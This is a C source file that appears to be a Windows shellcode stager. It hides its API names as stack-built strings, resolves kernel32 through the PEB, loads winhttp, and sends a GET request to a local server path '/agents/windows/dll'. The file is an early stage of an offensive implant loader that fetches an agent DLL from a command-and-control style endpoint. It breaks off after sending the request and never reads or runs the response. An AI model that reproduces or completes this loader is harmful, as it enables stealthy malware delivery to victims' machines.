#include <windows.h>
#include <winhttp.h>
#include "peb-lookup.h"

// It's worth noting that strings can be defined nside the .text section:
#pragma code_seg(".text")

__declspec(allocate(".text"))
wchar_t kernel32_str[] = L"kernel32.dll";

__declspec(allocate(".text"))
char load_lib_str[] = "LoadLibraryA";

int runCode()
{
    // Stack based strings for libraries and functions the shellcode needs
    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
    char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
    char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
    char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };

    // Stack based strings for libraries and functions the shellcode needs
    char winhttp_str[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', 0 };
    char winhttpopen_str[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    char winhttpconnect_str[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    char winhttpopenrequest_str[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    char winhttpsendrequest_str[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };

    // stack based strings to be passed to the messagebox win api
    wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
    wchar_t msg_title[] = { 'D','e','m','o','!', 0 };

    // resolve kernel32 image base
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) {
        return 1;
    }

    // resolve loadlibraryA() address
    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    if (!load_lib) {
        return 2;
    }

    // resolve getprocaddress() address
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!get_proc) {
        return 3;
    }

    // loadlibrarya and getprocaddress function definitions
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

    // load user32.dll
    LPVOID u32_dll = _LoadLibraryA(user32_dll_name);
    LPVOID winhttp_dll = _LoadLibraryA(winhttp_str);

    // resolve necessary function addresses
    LPVOID winhttpopen = get_func_by_name((HMODULE)winhttp_dll, winhttpopen_str);
    LPVOID winhttpconnect = get_func_by_name((HMODULE)winhttp_dll, winhttpconnect_str);
    LPVOID winhttpopenrequest = get_func_by_name((HMODULE)winhttp_dll, winhttpopenrequest_str);
    LPVOID winhttpsendrequest = get_func_by_name((HMODULE)winhttp_dll, winhttpsendrequest_str);

    // function definitions
    HINTERNET(WINAPI * _WinHttpOpen)(LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags) = (HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))winhttpopen;
    HINTERNET(WINAPI * _WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved) = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD))winhttpconnect;
    HINTERNET(WINAPI * _WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR FAR* ppwszAcceptTypes, DWORD dwFlags)  = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR FAR*, DWORD))winhttpopenrequest;
    BOOL(WINAPI * _WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext) = (BOOL(WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR))winhttpsendrequest;

    // use the winhttp functions to send the request
    HINTERNET hSession = _WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = _WinHttpConnect(hSession, L"localhost", 8081, 0);
    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"GET", L"/agents/windows/dll", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    BOOL bResults = _WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    

    return 0;
}